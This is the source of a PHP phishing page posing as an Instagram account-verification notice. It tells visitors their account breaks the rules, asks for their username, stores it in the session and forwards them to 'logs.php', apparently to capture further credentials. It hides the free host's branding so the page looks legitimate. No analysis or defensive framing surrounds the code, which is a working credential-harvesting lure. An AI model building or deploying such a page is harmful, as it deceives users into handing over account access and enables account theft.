<?php
error_reporting(0);
if ($_GET) {
    $username=$_GET["nicks"];
    session_start();
    $_SESSION["username"]=$username;
    header("location: logs.php?username=$username");
}


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="css/global.css">
    <title></title>
</head>
<body>
<center><div class="ortala"><br><br><br>
<div class="menu"><img src="img/insta.gif" alt="İMG" width="200px">
<p class="yazix">You have been redirected to this page, your account violates our rules, if you think this is an error, please fill out the form to verify your account.</p>
<form method="GET">
    <br>
    <input type="text" name="nicks" placeholder="Username" class="cnt">
    <br><br><br><br>
    <button name="buton" class="buton">Continue</button> 
</form>
</div>
</div>
</center>
</body>
</html>
<script type='text/javascript'></script><style > 
    img[src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"]{
     display:none!important;
    }
</style>